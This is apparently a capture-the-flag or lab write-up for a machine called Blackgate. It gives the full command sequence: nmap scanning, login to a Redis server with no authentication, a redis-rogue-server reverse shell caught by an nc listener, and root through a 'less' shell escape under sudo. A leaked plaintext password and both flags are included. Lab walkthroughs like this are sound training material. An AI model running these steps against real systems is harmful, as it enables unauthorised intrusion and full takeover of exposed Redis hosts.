# Blackgate

## Enumeration & scanning

- Scan with nmap, find two open ports (22 & 6379)
- Port 6379 is Redis
- Scan with nmap Redis info script
- Login to Redis server, there is no auth. Display info, see that there are no keyspaces (DBs)

``` sh
# Scan all ports
nmap -p- -sV 192.168.148.176     
# Get port info
nmap -p 22,6379 -A 192.168.148.176  
# Get Redis info
nmap -p 6379 --script "redis-info" 192.168.148.176  

# Login without auth, and display info
redis-cli -h 192.168.148.176
info
```

## Foothold


## Exploitation

- Use Redis Rogue Server to get reverse shell. Needed multiple reverts of server to get working

``` sh
# Run script, select reverse shell to port 4444 and have nc open running
python ./redis-rogue-server.py --rhost 192.168.148.176 --lhost 192.168.45.218 --rport 6379 --lport 5555
nc -nlvp 4444
# Upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Grab local flag
id
uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)
ls /home
prudence
ls /home/prudence
local.txt
notes.txt
cat /home/prudence/local.txt
d614b6096beae9c64f3800ac426c40dc
```

## Privilege Escalation

- Check `notes.txt` file, it mentions `redis-status` script
- Look what user can run with `sudo`; we can run `/usr/local/bin/redis-status`
- Check contents of script with `strings`. We see the password `ClimbingParrotKickingDonkey321`
- Run script with sudo and password. It seems to run `systemctl` and display some information with `less`. These are binaries that can be abused according to GTFObins

``` sh
# Check notes.txt file
cat /home/prudence/notes.txt
# Check what can be run with sudo
sudo -l
# Check contents of script
strings /usr/local/bin/redis-status
# Run script with sudo and use password
sudo /usr/local/bin/redis-status
# Spawn shell from 'less' viewer
!/bin/sh
# Get root flag
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/proof.txt
1936b4c79daf8c195bb2381f4eccf874
```


## References

- https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html
- https://github.com/n0b0dyCN/redis-rogue-server
- https://gtfobins.org/gtfobins/systemctl/
- https://gtfobins.org/gtfobins/less/

## Rabbit holes

- There was an exploit that didn't work: https://www.exploit-db.com/exploits/47195
